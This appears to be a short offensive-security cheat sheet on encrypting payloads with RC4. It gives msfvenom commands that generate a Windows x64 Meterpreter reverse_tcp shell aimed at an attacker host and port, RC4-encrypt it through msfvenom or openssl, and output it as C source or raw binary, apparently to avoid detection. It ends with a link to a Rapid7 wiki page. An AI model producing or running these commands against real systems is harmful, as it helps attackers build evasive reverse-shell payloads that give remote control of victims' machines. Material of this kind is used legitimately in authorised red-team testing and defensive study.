# RC4

## #metasploit

```
$ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> --encrypt rc4 --encrypt-key "rc4passw0rd\!" -f c -o payload_rc4.c

$ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -f raw | openssl enc -provider legacy -rc4 -nosalt -k "rc4passw0rd\!" -out payload_rc4.bin
```

## #openssl

```
$ openssl enc -provider legacy -rc4 -nosalt -k "rc4passw0rd\!" -in payload.bin -out encrypted_payload.bin
```

---
## References

### Rapid7

- [Rapid7: How to RC4 with Metasploit Framework Compiler](https://github.com/rapid7/metasploit-framework/wiki/How-to-decrypt-RC4-with-Metasploit-Framework-Compiler)